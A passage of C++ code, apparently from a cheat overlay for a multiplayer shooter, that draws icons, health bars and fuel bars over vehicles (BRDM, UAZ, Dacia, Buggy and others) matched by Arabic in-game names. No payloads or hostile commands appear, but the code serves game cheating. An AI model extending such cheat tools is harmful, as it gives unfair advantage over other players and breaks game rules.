													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 84.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 84.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_BRDM && Vehicle.Name == u8"ﻡﺇ ﻱﺩ ﺭﺃ ﻲﺑ")
											{

												if (Setting::vahicle_Text_item_BRDM_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 78.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 74, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 84.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Scooter && Vehicle.Name == u8"ﺮﺗﻮﻜﺳ")
											{
												if (Setting::vahicle_Text_item_Scooter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 79.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 75, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 79.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 75.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle && Vehicle.Name == u8"ﺔﻳﺭﺎﻧ ﺔﺟﺍﺭﺩ")
											{
												if (Setting::vahicle_Text_item_Motorcycle_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 97.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 93, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 97.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 93.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle3 && Vehicle.Name == u8"Motorcycle 3")
											{
												if (Setting::vahicle_Text_item_Motorcycle_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 84.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 84.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Snowmobile && Vehicle.Name == u8"ﺪﻴﻠﺟ ﺔﻓﺎﺣﺯ")
											{
												if (Setting::vahicle_Text_item_Snowmobile_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 104.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 100, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 104.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 100.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Tuk && Vehicle.Name == u8"ﻙﻮﺘﻛﻮﺗ")
											{
												if (Setting::vahicle_Text_item_Tuk_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 81.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 77, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 81.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 77.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Buggy && Vehicle.Name == u8"ﻲﺟﺎﺑ")
											{
												if (Setting::vahicle_Text_item_Buggy_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 69.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 65, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 69.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 65.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Sports && Vehicle.Name == u8"ﻭﺩﺍﺮﻴﻣ")
											{
												if (Setting::vahicle_Text_item_Sports_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 77.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 73, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 77.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 73.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Dacia && Vehicle.Name == u8"ﺎﻴﺳﺍﺩ")
											{
												if (Setting::vahicle_Text_item_Dacia_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 67.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 63, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 67.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 63.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Rony && Vehicle.Name == u8"ﻲﻧﻭﺭ")
											{
												if (Setting::vahicle_Text_item_Rony_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 71.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 67, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 71.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 67.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_UAZ && Vehicle.Name == u8"ﺐﻴﺟ")
											{
												if (Setting::vahicle_Text_item_UAZ_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 65.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 61, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 65.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 61.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Minibus && Vehicle.Name == u8"ﺓﺮﻴﻐﺻ ﺔﻠﻓﺎﺣ")
											{
												if (Setting::vahicle_Text_item_Minibus_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 86.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 82, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 84.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_PG117 && Vehicle.Name == u8"ﺔﻨﻴﻔﺳ")
											{
												if (Setting::vahicle_Text_item_PG117_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 60.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 56, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 60.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 56.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Aquarail && Vehicle.Name == u8"ﺏﺭﺎﻗ")
											{
												if (Setting::vahicle_Text_item_Aquarail_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 68.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 64, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 68.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 64.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_BigFoot && Vehicle.Name == u8"ﺓﺮﻴﺒﻛ ﺔﻨﺣﺎﺷ")
											{
												if (Setting::vahicle_Text_item_BigFoot_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 118.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 114, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 118.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 114.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_UTV && Vehicle.Name == u8"ﻲﻓ ﻲﺗ ﻮﻳ")
											{
												if (Setting::vahicle_Text_item_UTV_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 60.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 56, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 60.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 56.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Capsule && Vehicle.Name == u8"Capsule")
											{
												if (Setting::vahicle_Text_item_Capsule_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 84.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 84.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Coupe && Vehicle.Name == u8"ﻪﻴﺑﻮﻛ")
											{
												if (Setting::vahicle_Text_item_Coupe_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 83.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 79, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 83.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 79.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_PickUpTruck && Vehicle.Name == u8"ﺓﺮﻴﻐﺻ ﺔﻨﺣﺎﺷ")
											{
												if (Setting::vahicle_Text_item_PickUpTruck_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 136.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 132, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 136.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 132.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_SnowBike && Vehicle.Name == u8"ﺔﻴﺠﻠﺛ ﺔﺟﺍﺭﺩ")
											{
												if (Setting::vahicle_Text_item_SnowBike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
